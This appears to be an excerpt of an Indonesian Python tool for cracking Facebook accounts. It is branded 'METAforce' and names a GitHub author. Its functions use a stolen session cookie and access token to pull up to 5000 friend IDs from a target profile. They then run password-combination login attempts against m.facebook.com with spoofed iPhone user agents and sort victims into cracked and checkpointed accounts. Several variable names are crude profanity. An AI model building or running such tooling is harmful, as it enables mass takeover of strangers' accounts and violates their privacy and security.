...
header_grup = {"user-agent": "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 seperti Mac OS X) AppleWebKit/602.1.50 (KHTML, seperti Gecko) Version/10,0 Mobile/19E241 Safari/602.1"}
...
#agen2 = ['Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 seperti Mac OS X) AppleWebKit/602.1.50 (KHTML, seperti Gecko) Versi/10,0 Seluler/15E148 Safari/602.1']
###########################################################################################
...
def logo():
 ...
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║META FACEBOOK METHOD║▌║▌║█│▌{N} """)
    ...
    print(f"║{P}[{H}•{P}] Github    : github.com/sholeh_ars/meta baru{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : Premium{P}     {N}║")
    print(f"║{P}[{H}•{P}] Support   : 64bit &32           {N}║")
    print(f"║{P}[{H}•{P}] Network   : {H}IM3{N}, {H}AXIS/XL{N}, {H}3{N}         ║")
    print(f"║{P}[{H}•{P}] SC Version: V-14.5 ({K}METAforce{P})            {N}║")
    print("╚════════════════════════════════════════╝")
#CRACK SELESAI
def hasil(ok,cp):
...
def cek_pw():
    try:
        ...
        if pil =="":
            ...
            os.system('xdg-open mNtan .com?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
...
def yayanxd():
    ...
    try:
    	...
    	data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 seperti Mac OS X) AppleWebKit/602.1.50 (KHTML, seperti Gecko) Version/10,0 Mobile/19E241 Safari/602.1","referer": ".https://m.facebook.com/home.php?tbua=1","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___})
...
###### CRACK ID PUBLIK SINGEL #####
        ...
        try:
        	...
        	for pi in requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()['friends']['data']:
                		uid = pi["id"]
                		nama = pi["name"]
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[Sholeh-OK] ","\x1b[1;93m[Sholeh-OK] ").replace("[Sholeh-CP] ", "\x1b[1;92m[Sholeh-CP] ")
...
# PROSES CRACK METODE 3 in 1
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            xx = "https://m.facebook.com/home.php?tbua=1"
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
